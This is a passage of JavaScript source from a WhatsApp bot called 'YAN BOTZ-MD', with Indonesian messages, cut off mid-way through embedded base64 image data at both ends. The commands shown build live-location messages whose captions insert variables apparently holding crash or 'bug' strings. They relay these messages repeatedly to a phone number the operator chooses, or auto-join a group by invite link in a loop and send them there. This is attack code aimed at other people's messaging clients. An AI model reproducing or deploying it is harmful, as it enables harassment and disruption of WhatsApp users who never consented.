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"
}
}), { userJid: m.chat, quoted: doc })
jobotz.relayMessage(`${text}@s.whatsapp.net`, liveLocation.message, { messageId: liveLocation.key.id })
jobotz.relayMessage(`${text}@s.whatsapp.net`, liveLocation.message, { messageId: liveLocation.key.id })
jobotz.relayMessage(`${text}@s.whatsapp.net`, liveLocation.message, { messageId: liveLocation.key.id })
jobotz.relayMessage(`${text}@s.whatsapp.net`, liveLocation.message, { messageId: liveLocation.key.id })
jobotz.relayMessage(`${text}@s.whatsapp.net`, liveLocation.message, { messageId: liveLocation.key.id })
jobotz.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
jobotz.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
jobotz.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
jobotz.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
jobotz.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
buttonjo(`Berhasil Mengirim Liveloc Di Nomer ${text}`)
}
break
case 'jolivelocto': {
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let doc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9366881,
"degreesLongitude": 107.7228148,
"caption": `YAN BOTZ-MD ${philips} ${ngazap(prefix)}`,
"sequenceNumber": "1657997490287001",
"jpegThumbnail": "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"
}
}), { userJid: m.chat, quoted: doc })
jobotz.relayMessage(`${text}@s.whatsapp.net`, liveLocation.message, { messageId: liveLocation.key.id })
jobotz.relayMessage(`${text}@s.whatsapp.net`, liveLocation.message, { messageId: liveLocation.key.id })
jobotz.relayMessage(`${text}@s.whatsapp.net`, liveLocation.message, { messageId: liveLocation.key.id })
jobotz.relayMessage(`${text}@s.whatsapp.net`, liveLocation.message, { messageId: liveLocation.key.id })
jobotz.relayMessage(`${text}@s.whatsapp.net`, liveLocation.message, { messageId: liveLocation.key.id })
await repjo(`Berhasil Mengirim liveloc Di Nomer ${text}`)
}
break

case 'livelocgc': {
if (!isCreator && !isBan) return
if (!q) return repjo(`Linkgc mana?\nContoh: ${prefix+command} (linkgroup)`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) repjo(`Masukkan linkgc yg valid`)
let result = args[0].split('https://chat.whatsapp.com/')[1]
jumlah = '3'
for (let i = 0; i < jumlah; i++) {
let tosendgc = await jobotz.groupAcceptInvite(result)
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9366881,
"degreesLongitude": 107.7228148,
"caption":`YAN BOTZ-MD ${philips} ${ngazap(prefix)}`,
"sequenceNumber": "1657997490287001",
"jpegThumbnail": "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